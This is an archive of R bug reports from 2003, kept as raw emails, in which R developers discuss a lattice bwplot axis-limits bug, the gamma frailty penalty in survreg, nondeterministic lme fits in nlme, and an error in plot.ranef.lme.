==> 2865.followup.1 <==
From deepayan@stat.wisc.edu Tue May 13 23:50:16 2003
Received: from sabe.cs.wisc.edu (sabe.cs.wisc.edu [128.105.6.20])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h4DLoF2b002288
	for <R-bugs@biostat.ku.dk>; Tue, 13 May 2003 23:50:15 +0200 (MET DST)
Received: from 192.168.0.114 (66-188-128-48.mad.wi.charter.com [66.188.128.48])
	(authenticated (0 bits))
	by sabe.cs.wisc.edu (8.11.3/8.11.3) with ESMTP id h4DLoEt21481
	(using TLSv1/SSLv3 with cipher RC4-MD5 (128 bits) verified NO);
	Tue, 13 May 2003 16:50:14 -0500
From: Deepayan Sarkar <deepayan@stat.wisc.edu>
To: rmh@surfer.sbm.temple.edu
Subject: Re: [Rd] bug in y limits in bwplot (PR#2865)
Date: Tue, 13 May 2003 16:50:29 -0500
User-Agent: KMail/1.5.1
Cc: R-bugs@biostat.ku.dk
References: <200304280620.h3S6KdpD006495@pubhealth.ku.dk>
In-Reply-To: <200304280620.h3S6KdpD006495@pubhealth.ku.dk>
MIME-Version: 1.0
Content-Type: text/plain;
  charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline
Message-Id: <200305131650.29426.deepayan@stat.wisc.edu>


This turns out to be a long-standing bug (in all the lattice functions in 
fact, not only bwplot). Should be fixed in the next release. A workaround is 
to use xlim and ylim directly instead of limits in scale.

On Monday 28 April 2003 01:20, rmh@surfer.sbm.temple.edu wrote:

> ## bug in y limits in bwplot
>
> tmp <- data.frame(y=1:10, a=factor(rep(1:2,5)))
>
> ## x limits in bwplot works as expected
> bwplot(y ~ a, data=tmp, horizontal=F)  # works
>
> bwplot(y ~ a, data=tmp, horizontal=F,  # works
>        xlim=c(-1,5))
>
> bwplot(y ~ a, data=tmp, horizontal=F,  # works
>        scales=list(x=list(limits=c(-1,5))))
>
>
> ## problem with y limits in bwplot
> bwplot(a ~ y, data=tmp, horizontal=T)  # works
>
> bwplot(a ~ y, data=tmp, horizontal=T,  # works
>        ylim=c(-1,5))
>
> bwplot(a ~ y, data=tmp, horizontal=T,  # error message
>        scales=list(y=list(limits=c(-1,5))))
>
>
> ## transcript with error message
>
> > bwplot(a ~ y, data=tmp, horizontal=T,  # error message
>
> +        scales=list(y=list(limits=c(-1,5))))
> Error in print.trellis(structure(list(as.table = FALSE, aspect.fill = TRUE,
>  : Invalid value for labels
> In addition: Warning message:
> is.na() applied to non-(list or vector) in: is.na(x)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2933 *
Subject: frailty models in survreg() -- survival package
From: Jerome Asselin <jerome@hivnet.ubc.ca>
Date: Tue, 6 May 2003 15:36:23 -0700
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2933 <==
From jerome@hivnet.ubc.ca Wed May  7 00:36:58 2003
Received: from hivnet.ubc.ca (hivnet.ubc.ca [142.103.173.1])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h46Mau2b029257
	for <r-bugs@biostat.ku.dk>; Wed, 7 May 2003 00:36:57 +0200 (MET DST)
Received: from there (jeromePC [142.103.173.13])
	by hivnet.ubc.ca (8.9.0/8.9.0) with SMTP id PAA26505;
	Tue, 6 May 2003 15:42:06 -0700 (PDT)
Message-Id: <200305062242.PAA26505@hivnet.ubc.ca>
Content-Type: text/plain;
  charset="iso-8859-1"
From: Jerome Asselin <jerome@hivnet.ubc.ca>
Organization: BC Centre for Excellence in HIV/AIDS
To: r-bugs@biostat.ku.dk
Subject: frailty models in survreg() -- survival package
Date: Tue, 6 May 2003 15:36:23 -0700
X-Mailer: KMail [version 1.3.2]
Cc: Thomas Lumley <tlumley@u.washington.edu>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit


I am confused on how the log-likelihood is calculated in a parametric 
survival problem with frailty. I see a contradiction in the frailty() help 
file vs. the source code of frailty.gamma(), frailty.gaussian() and 
frailty.t().

The function frailty.gaussian() appears to calculate the penalty as the 
negative log-density of independent Gaussian variables, as one would 
expect:
> frailty.gaussian
[...]
            list([...], penalty = 0.5 * sum(coef^2/theta +
                log(2 * pi * theta)), flag = FALSE)
[...]

Similarly, the frailty.t() appears to use the joint negative log-density 
of Student t random variables. HOWEVER, frailty.gamma() uses:
> frailty.gamma
[...]
            list([...], penalty = -sum(coef) *
                nu, flag = FALSE)
[...]
I would rather expect to see something like:
(1)    penalty=sum(coef*nu-(nu-1)*log(coef)+lgamma(nu)-nu*log(nu))
which is the joint negative log-density of gamma variables. Alternately, I 
could also expect to see something like this:
(2)    penalty=sum(coef-exp(coef))*nu
which was shown to lead to the same EM solution as penalty (1) -- at least 
in the case of a Cox proportional hazard model (Therneau and Grambsch, 
2000. Modeling Survival Data, Extending the Cox Model. Springer, New York. 
Page 254, Eq. (9.8).). Bare we me, I don't know whether this holds in the 
case of a parametric model. I also have concerns about the validity of the 
likelihood ratio tests obtained with the latter penalty function (2), 
because this penalty is NOT equal to the negative log-likelihood (1). 
Finally, it's not clear to me whether we gain significant convergence 
speed and accuracy by using the penalty (2) as opposed to (1).

Furthermore, the help file for frailty() says,
     "The penalised likelihood method is equivalent to maximum (partial)
     likelihood for the gamma frailty but not for the others."

In the current state of the package, I would think that this should be the 
other way around. That is,
     "The penalised likelihood method is equivalent to maximum (partial)
     likelihood for the gaussian and t frailty but not for the gamma."

However, my current comprehension of the problem leads me to recommend to 
use the negative log-likelihood of gamma variables (2). Hence, both gamma, 
Gaussian and t frailty would be equivalent to maximum (partial) likelihood.

Any comment on this issue would be much appreciated.

Sincerely,
Jerome Asselin

R 1.6.2 on Red Hat Linux 7.2
Package: survival
Version: 2.9-7

-- 

Jerome Asselin (Jérôme), Statistical Analyst
British Columbia Centre for Excellence in HIV/AIDS
St. Paul's Hospital, 608 - 1081 Burrard Street
Vancouver, British Columbia, CANADA V6Z 1Y6
Email: jerome@hivnet.ubc.ca
Phone: 604 806-9112   Fax: 604 806-9044

==> 2933.audit <==
Tue May 13 16:48:37 2003	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2934 *
Subject: Re: frailty models in survreg() -- survival package
From: Thomas Lumley <tlumley@u.washington.edu>
Date: Tue, 6 May 2003 15:58:37 -0700 (PDT)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2934 <==
From tlumley@u.washington.edu Wed May  7 00:58:41 2003
Received: from mxout5.cac.washington.edu (mxout5.cac.washington.edu [140.142.32.135])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h46Mwd2b029319
	for <r-bugs@biostat.ku.dk>; Wed, 7 May 2003 00:58:40 +0200 (MET DST)
Received: from homer14.u.washington.edu (homer14.u.washington.edu [140.142.8.14])
	by mxout5.cac.washington.edu (8.12.1+UW03.04/8.12.1+UW02.12) with ESMTP id h46Mwct7021392;
	Tue, 6 May 2003 15:58:38 -0700
Received: from localhost (tlumley@localhost)
	by homer14.u.washington.edu (8.12.1+UW03.04/8.12.1+UW02.12) with ESMTP id h46MwbSk071522;
	Tue, 6 May 2003 15:58:37 -0700
Date: Tue, 6 May 2003 15:58:37 -0700 (PDT)
From: Thomas Lumley <tlumley@u.washington.edu>
To: Jerome Asselin <jerome@hivnet.ubc.ca>
cc: r-bugs@biostat.ku.dk
Subject: Re: frailty models in survreg() -- survival package
In-Reply-To: <200305062242.PAA26505@hivnet.ubc.ca>
Message-ID: <Pine.A41.4.44.0305061551340.23944-100000@homer14.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Tue, 6 May 2003, Jerome Asselin wrote:

>
> I am confused on how the log-likelihood is calculated in a parametric
> survival problem with frailty. I see a contradiction in the frailty() help
> file vs. the source code of frailty.gamma(), frailty.gaussian() and
> frailty.t().
>
> The function frailty.gaussian() appears to calculate the penalty as the
> negative log-density of independent Gaussian variables, as one would
> expect:
> > frailty.gaussian
> [...]
>             list([...], penalty = 0.5 * sum(coef^2/theta +
>                 log(2 * pi * theta)), flag = FALSE)
> [...]
>
> Similarly, the frailty.t() appears to use the joint negative log-density
> of Student t random variables. HOWEVER, frailty.gamma() uses:
> > frailty.gamma
> [...]
>             list([...], penalty = -sum(coef) *
>                 nu, flag = FALSE)
> [...]
> I would rather expect to see something like:
> (1)    penalty=sum(coef*nu-(nu-1)*log(coef)+lgamma(nu)-nu*log(nu))
> which is the joint negative log-density of gamma variables. Alternately, I
> could also expect to see something like this:
> (2)    penalty=sum(coef-exp(coef))*nu
> which was shown to lead to the same EM solution as penalty (1) -- at least
> in the case of a Cox proportional hazard model (Therneau and Grambsch,
> 2000. Modeling Survival Data, Extending the Cox Model. Springer, New York.
> Page 254, Eq. (9.8).).

Looking at a wider context in the code

   pfun <- function(coef, theta, ndeath) {
        if (theta == 0)
            list(recenter = 0, penalty = 0, flag = TRUE)
        else {
            recenter <- log(mean(exp(coef)))
            coef <- coef - recenter
            nu <- 1/theta
            list(recenter = recenter, first = (exp(coef) - 1) *
                nu, second = exp(coef) * nu, penalty = -sum(coef) *
                nu, flag = FALSE)
        }
    }

so the recentering means the penalty is actually your penalty (2) -- not
surprising, as the code was written by Terry Therneau.



> Bare we me, I don't know whether this holds in the
> case of a parametric model. I also have concerns about the validity of the
> likelihood ratio tests obtained with the latter penalty function (2),
> because this penalty is NOT equal to the negative log-likelihood (1).
> Finally, it's not clear to me whether we gain significant convergence
> speed and accuracy by using the penalty (2) as opposed to (1).
>
> Furthermore, the help file for frailty() says,
>      "The penalised likelihood method is equivalent to maximum (partial)
>      likelihood for the gamma frailty but not for the others."
>
> In the current state of the package, I would think that this should be the
> other way around. That is,
>      "The penalised likelihood method is equivalent to maximum (partial)
>      likelihood for the gaussian and t frailty but not for the gamma."
>
> However, my current comprehension of the problem leads me to recommend to
> use the negative log-likelihood of gamma variables (2). Hence, both gamma,
> Gaussian and t frailty would be equivalent to maximum (partial) likelihood.
>

The log density penalty doesn't give maximum likelihood (which you would
get by integrating out the frailties). It gives the joint likelihood of
the data and the random effects.

For the gamma model, as you note, they are equivalent.  I believe that the
current state of knowledge is that the log density penalty generally gives
consistent estimates but is not equivalent to maximum likelihood. However,
I have not actually seen the arguments for consistency and it isn't
obvious to me how the argument would go.


	-thomas


==> 2934.followup.1 <==
From jerome@hivnet.ubc.ca Wed May  7 01:54:08 2003
Received: from hivnet.ubc.ca (hivnet.ubc.ca [142.103.173.1])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h46Ns62b029455
	for <r-bugs@biostat.ku.dk>; Wed, 7 May 2003 01:54:07 +0200 (MET DST)
Received: from there (jeromePC [142.103.173.13])
	by hivnet.ubc.ca (8.9.0/8.9.0) with SMTP id QAA29199;
	Tue, 6 May 2003 16:59:12 -0700 (PDT)
Message-Id: <200305062359.QAA29199@hivnet.ubc.ca>
Content-Type: text/plain;
  charset="iso-8859-1"
From: Jerome Asselin <jerome@hivnet.ubc.ca>
Organization: BC Centre for Excellence in HIV/AIDS
To: Thomas Lumley <tlumley@u.washington.edu>
Subject: Re: frailty models in survreg() -- survival package (PR#2934)
Date: Tue, 6 May 2003 16:53:29 -0700
X-Mailer: KMail [version 1.3.2]
Cc: r-bugs@biostat.ku.dk
References: <Pine.A41.4.44.0305061551340.23944-100000@homer14.u.washington.edu>
In-Reply-To: <Pine.A41.4.44.0305061551340.23944-100000@homer14.u.washington.edu>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit


SEE ALSO ORIGINAL POSTING IN PR#2933

On May 6, 2003 03:58 pm, Thomas Lumley wrote:
>
> Looking at a wider context in the code
>
>    pfun <- function(coef, theta, ndeath) {
>         if (theta == 0)
>             list(recenter = 0, penalty = 0, flag = TRUE)
>         else {
>             recenter <- log(mean(exp(coef)))
>             coef <- coef - recenter
>             nu <- 1/theta
>             list(recenter = recenter, first = (exp(coef) - 1) *
>                 nu, second = exp(coef) * nu, penalty = -sum(coef) *
>                 nu, flag = FALSE)
>         }
>     }
>
> so the recentering means the penalty is actually your penalty (2) -- not
> surprising, as the code was written by Terry Therneau.

Ok, I forgot to account for the recentering. However, correct me if I am 
wrong, but if Therneau and Grambsch (2000, Eq. (9.8)) are right, I think 
it should be:
            recenter <- mean(exp(coef))
instead of
            recenter <- log(mean(exp(coef)))

>
> The log density penalty doesn't give maximum likelihood (which you would
> get by integrating out the frailties). It gives the joint likelihood of
> the data and the random effects.

I'm confused... Do you mean that the log-likelihood of all model 
parameters (which is maximised) is NOT the sum of the conditional 
log-likelihood of the data and the log-likelihood of the random effects?

>
> For the gamma model, as you note, they are equivalent.  I believe that
> the current state of knowledge is that the log density penalty generally
> gives consistent estimates but is not equivalent to maximum likelihood.
> However, I have not actually seen the arguments for consistency and it
> isn't obvious to me how the argument would go.
>

Sorry, I don't understand why you say that they are equivalent for the 
gamma model. Therneau and Grambsch (p.254) specifically note,
"... the penalized loglikelihood and the observed-data loglikelihood in 
equation (9.4) have the same solution, although these two equations are 
NOT equal to one another."
For that reason, I think that the help file should read,
> >      "The penalised likelihood method is equivalent to maximum
> > (partial) likelihood for the gaussian and t frailty but not for the
> > gamma."

Also, is it clear whether the current gamma penalty function remains valid 
even in the case of parametric survival analysis? Is it computationally 
better than (1)? Finally, what is the meaning of the "loglik" value in 
gamma frailty? Can it still be used to calculate likelihood ratio tests?

Cheers,
Jerome

==> 2934.audit <==
Tue May 13 16:48:37 2003	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2985 *
Subject: update.lme trouble
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 12 May 2003 17:59:41 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2985 <==
From mailnull@stat.math.ethz.ch Mon May 12 17:54:40 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h4CFsd2b019251
	for <R-bugs@biostat.ku.dk>; Mon, 12 May 2003 17:54:39 +0200 (MET DST)
Received: from hypatia.math.ethz.ch (localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h4CFsZ6s000908
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Mon, 12 May 2003 17:54:36 +0200 (MEST)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.9/8.12.6/Submit) id h4CFsZhn000899
	for R-bugs@biostat.ku.dk; Mon, 12 May 2003 17:54:35 +0200 (MEST)
Received: from pubhealth.ku.dk (mail.kubism.ku.dk [192.38.18.10])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h4CFsS6r000755
	for <r-bugs@hypatia.math.ethz.ch>; Mon, 12 May 2003 17:54:28 +0200 (MEST)
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h4CFsQ2b019248
	for <r-bugs@hypatia.math.ethz.ch>; Mon, 12 May 2003 17:54:26 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (localhost.localdomain [127.0.0.1])
	by blueberry.kubism.ku.dk (8.12.8/8.12.8) with ESMTP id h4CFxg8e024887
	for <r-bugs@hypatia.math.ethz.ch>; Mon, 12 May 2003 17:59:43 +0200
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.12.8/8.12.8/Submit) id h4CFxfjs024883;
	Mon, 12 May 2003 17:59:41 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: r-bugs@stat.math.ethz.ch
Subject: update.lme trouble
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 12 May 2003 17:59:41 +0200
Message-ID: <x265og9mvm.fsf@biostat.ku.dk>
Lines: 35
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=-7.8 required=4.8 tests=USER_AGENT_GNUS_UA,X_AUTH_WARNING version=2.53
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.53 (1.174.2.15-2003-03-30-exp)


Try this

data(Assay)
as1 <- lme(logDens~sample*dilut, data=Assay,
           random=pdBlocked(list(
                     pdIdent(~1),
                     pdIdent(~sample-1),
                     pdIdent(~dilut-1))))

update(as1,random=pdCompSymm(~sample-1))
update(as1,random=pdCompSymm(~sample-1))
update(as1,random=pdCompSymm(~sample-1))
update(as1,random=pdCompSymm(~sample-1))

I'm getting different results on different invocations!
         _
platform i686-pc-linux-gnu
arch     i686
os       linux-gnu
system   i686, linux-gnu
status
major    1
minor    7.0
year     2003
month    04
day      16
language R

But similar things have been seen on Windows earlier today.
-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907


==> 2985.audit <==
Tue May 13 15:12:14 2003	ripley	moved from incoming to Add-ons

==> 2985.reply.1 <==
From bates@bates4.stat.wisc.edu Thu May 15 18:28:50 2003
Received: from bates4.stat.wisc.edu (mail@bates4.stat.wisc.edu [128.105.174.134])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h4FGSn2b022974;
	Thu, 15 May 2003 18:28:49 +0200 (MET DST)
Received: from bates by bates4.stat.wisc.edu with local (Exim 3.36 #1 (Debian))
	id 19GLb7-0003oj-00; Thu, 15 May 2003 11:28:49 -0500
To: p.dalgaard@biostat.ku.dk
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] update.lme trouble (PR#2985)
References: <200305121554.h4CFsf2b019255@pubhealth.ku.dk>
From: Douglas Bates <bates@stat.wisc.edu>
Date: 15 May 2003 11:28:49 -0500
In-Reply-To: <200305121554.h4CFsf2b019255@pubhealth.ku.dk>
Message-ID: <6ry918i37i.fsf@bates4.stat.wisc.edu>
Lines: 34
User-Agent: Gnus/5.0808 (Gnus v5.8.8) XEmacs/21.4 (Common Lisp)
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Sender: Douglas Bates <bates@bates4.stat.wisc.edu>

p.dalgaard@biostat.ku.dk writes:

> Try this
> 
> data(Assay)
> as1 <- lme(logDens~sample*dilut, data=Assay,
>            random=pdBlocked(list(
>                      pdIdent(~1),
>                      pdIdent(~sample-1),
>                      pdIdent(~dilut-1))))
> 
> update(as1,random=pdCompSymm(~sample-1))
> update(as1,random=pdCompSymm(~sample-1))
> update(as1,random=pdCompSymm(~sample-1))
> update(as1,random=pdCompSymm(~sample-1))
> 
> I'm getting different results on different invocations!

I'm not sure exactly what the problem was but it could be triggered by
calling lme directly rather than through update.  That is, successive
calls to
  lme(logDens~sample*dilut, data=Assay, random=pdCompSymm(~sample-1))
would alternate between a successful fit and an error.

The problem does *not* occur with the current r-patched, which will be
released as R-1.7.1 in early June.  At least it does not occur under
Linux.  I would appreciate it if someone could check with r-patched
under Windows.

I have added this example as one of the tests in nlme_3.1-40, which
will be released before R-1.7.1




==> 2985.reply.2 <==
From p.dalgaard@biostat.ku.dk Thu May 15 21:45:36 2003
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h4FJjZ2b023663;
	Thu, 15 May 2003 21:45:35 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (localhost.localdomain [127.0.0.1])
	by blueberry.kubism.ku.dk (8.12.8/8.12.8) with ESMTP id h4FJpG8e005381;
	Thu, 15 May 2003 21:51:16 +0200
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.12.8/8.12.8/Submit) id h4FJpG9h005377;
	Thu, 15 May 2003 21:51:16 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: Douglas Bates <bates@stat.wisc.edu>
Cc: p.dalgaard@biostat.ku.dk, r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] update.lme trouble (PR#2985)
References: <200305121554.h4CFsf2b019255@pubhealth.ku.dk>
	<6ry918i37i.fsf@bates4.stat.wisc.edu>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 15 May 2003 21:51:16 +0200
In-Reply-To: <6ry918i37i.fsf@bates4.stat.wisc.edu>
Message-ID: <x2znlodm4r.fsf@biostat.ku.dk>
Lines: 143
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

Douglas Bates <bates@stat.wisc.edu> writes:

> p.dalgaard@biostat.ku.dk writes:
> 
> > Try this
> > 
> > data(Assay)
> > as1 <- lme(logDens~sample*dilut, data=Assay,
> >            random=pdBlocked(list(
> >                      pdIdent(~1),
> >                      pdIdent(~sample-1),
> >                      pdIdent(~dilut-1))))
> > 
> > update(as1,random=pdCompSymm(~sample-1))
> > update(as1,random=pdCompSymm(~sample-1))
> > update(as1,random=pdCompSymm(~sample-1))
> > update(as1,random=pdCompSymm(~sample-1))
> > 
> > I'm getting different results on different invocations!
> 
> I'm not sure exactly what the problem was but it could be triggered by
> calling lme directly rather than through update.  That is, successive
> calls to
>   lme(logDens~sample*dilut, data=Assay, random=pdCompSymm(~sample-1))
> would alternate between a successful fit and an error.
> 
> The problem does *not* occur with the current r-patched, which will be
> released as R-1.7.1 in early June.

It does for me! (RedHat 8.0):

R : Copyright 2003, The R Development Core Team
Version 1.7.0 Patched (2003-05-15)

R is free software and comes with ABSOLUTELY NO WARRANTY.
You are welcome to redistribute it under certain conditions.
Type `license()' or `licence()' for distribution details.

R is a collaborative project with many contributors.
Type `contributors()' for more information.

Type `demo()' for some demos, `help()' for on-line help, or
`help.start()' for a HTML browser interface to help.
Type `q()' to quit R.

> library(nlme)
Loading required package: lattice
Loading required package: grid
> data(Assay)
> lme(logDens~sample*dilut, data=Assay, random=pdCompSymm(~sample-1))
Error in if ((aux <- mean(aux[row(aux) != col(aux)])) <= -1/(nc - 1))
{ :
        missing value where TRUE/FALSE needed
In addition: There were 25 warnings (use warnings() to see them)
> lme(logDens~sample*dilut, data=Assay, random=pdCompSymm(~sample-1))
Linear mixed-effects model fit by REML
  Data: Assay
  Log-restricted-likelihood: 38.47943
  Fixed: logDens ~ sample * dilut
   (Intercept)        sampleb        samplec        sampled
samplee
  -0.182791540    0.080753295    0.133976305    0.207698745
-0.023672400
       samplef         dilut2         dilut3         dilut4
dilut5
   0.073569240    0.204429030    0.405863085    0.573191050
0.720635465
sampleb:dilut2 samplec:dilut2 sampled:dilut2 samplee:dilut2 samplef:dilut2
   0.008938930   -0.008495275    0.001079295   -0.041917525
0.019352105
sampleb:dilut3 samplec:dilut3 sampled:dilut3 samplee:dilut3 samplef:dilut3
  -0.025066045    0.018645100    0.003988575   -0.027712815
0.054316035
sampleb:dilut4 samplec:dilut4 sampled:dilut4 samplee:dilut4 samplef:dilut4
   0.060788600    0.005259755   -0.016485510    0.049798755
0.063371900
sampleb:dilut5 samplec:dilut5 sampled:dilut5 samplee:dilut5 samplef:dilut5
  -0.045762455   -0.072598205   -0.177756610    0.013610930
0.004023400

Random effects:
 Formula: ~sample - 1 | Block
 Structure: Compound Symmetry
         StdDev     Corr
samplea  0.02712464
sampleb  0.02712464 0.154
samplec  0.02712464 0.154 0.154
sampled  0.02712464 0.154 0.154 0.154
samplee  0.02712464 0.154 0.154 0.154 0.154
samplef  0.02712464 0.154 0.154 0.154 0.154 0.154
Residual 0.04255631

Number of Observations: 60
Number of Groups: 2
> lme(logDens~sample*dilut, data=Assay, random=pdCompSymm(~sample-1))
Linear mixed-effects model fit by REML
  Data: Assay
  Log-restricted-likelihood: 36.62856
  Fixed: logDens ~ sample * dilut
   (Intercept)        sampleb        samplec        sampled
samplee
  -0.182791540    0.080753295    0.133976305    0.207698745
-0.023672400
       samplef         dilut2         dilut3         dilut4
dilut5
   0.073569240    0.204429030    0.405863085    0.573191050
0.720635465
sampleb:dilut2 samplec:dilut2 sampled:dilut2 samplee:dilut2 samplef:dilut2
   0.008938930   -0.008495275    0.001079295   -0.041917525
0.019352105
sampleb:dilut3 samplec:dilut3 sampled:dilut3 samplee:dilut3 samplef:dilut3
  -0.025066045    0.018645100    0.003988575   -0.027712815
0.054316035
sampleb:dilut4 samplec:dilut4 sampled:dilut4 samplee:dilut4 samplef:dilut4
   0.060788600    0.005259755   -0.016485510    0.049798755
0.063371900
sampleb:dilut5 samplec:dilut5 sampled:dilut5 samplee:dilut5 samplef:dilut5
  -0.045762455   -0.072598205   -0.177756610    0.013610930
0.004023400

Random effects:
 Formula: ~sample - 1 | Block
 Structure: Compound Symmetry
         StdDev        Corr
samplea  1.464982e-141
sampleb  1.464982e-141 0
samplec  1.464982e-141 0    0
sampled  1.464982e-141 0    0 0
samplee  1.464982e-141 0    0 0 0
samplef  1.464982e-141 0    0 0 0 0
Residual  5.046555e-02

Number of Observations: 60
Number of Groups: 2
There were 50 or more warnings (use warnings() to see the first 50)



-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2986 *
Subject: plot.ranef.lme
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 12 May 2003 18:19:28 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2986 <==
From mailnull@stat.math.ethz.ch Mon May 12 18:14:24 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h4CGEN2b019376
	for <R-bugs@biostat.ku.dk>; Mon, 12 May 2003 18:14:24 +0200 (MET DST)
Received: from hypatia.math.ethz.ch (localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h4CGEK6s005731
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Mon, 12 May 2003 18:14:21 +0200 (MEST)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.9/8.12.6/Submit) id h4CGEKQh005730
	for R-bugs@biostat.ku.dk; Mon, 12 May 2003 18:14:20 +0200 (MEST)
Received: from pubhealth.ku.dk (mail.kubism.ku.dk [192.38.18.10])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h4CGEF6r005673
	for <r-bugs@hypatia.math.ethz.ch>; Mon, 12 May 2003 18:14:15 +0200 (MEST)
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h4CGED2b019373
	for <r-bugs@hypatia.math.ethz.ch>; Mon, 12 May 2003 18:14:13 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (localhost.localdomain [127.0.0.1])
	by blueberry.kubism.ku.dk (8.12.8/8.12.8) with ESMTP id h4CGJT8e024933
	for <r-bugs@hypatia.math.ethz.ch>; Mon, 12 May 2003 18:19:29 +0200
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.12.8/8.12.8/Submit) id h4CGJTth024929;
	Mon, 12 May 2003 18:19:29 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: r-bugs@stat.math.ethz.ch
Subject: plot.ranef.lme
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 12 May 2003 18:19:28 +0200
Message-ID: <x21xz49lyn.fsf@biostat.ku.dk>
Lines: 33
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=-7.8 required=4.8 tests=USER_AGENT_GNUS_UA,X_AUTH_WARNING version=2.53
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.53 (1.174.2.15-2003-03-30-exp)


library(nlme)
data(Phenobarb)
na.include <- function(x)x
phe1 <- nlme(conc~phenoModel(Subject, time, dose, lCl, lV),
     data  = Phenobarb,
     fixed = lCl+lV~1,
     random= pdDiag(lCl+lV~1),
     start = c(-5,0),
     na.action = na.include,
     naPattern = ~!is.na(conc))

phe.ranef <- ranef(phe1,augFrame=TRUE)
plot(phe.ranef, form=lCl~Wt+ApgarInd)

[Error in max(length(x0), length(x1), length(y0), length(y1)) :
        Argument "x0" is missing, with no default]

The cause is plain to see: in plot.ranef.lme we have

            staple.ends <- list(x1 = c(rep(X - w, 2), rep(X +
                w, 2)), y1 = rep(c(Y[5], max(Y[1] - e.u, Y[2])),
                2), x2 = c(rep(X - w, 2), rep(X + w, 2)), y2 = rep(c(min(Y[5] +                e.l, Y[4]), Y[1]), 2))
                       . . . .
            do.call("lsegments", c(staple.ends, box.umbrella))

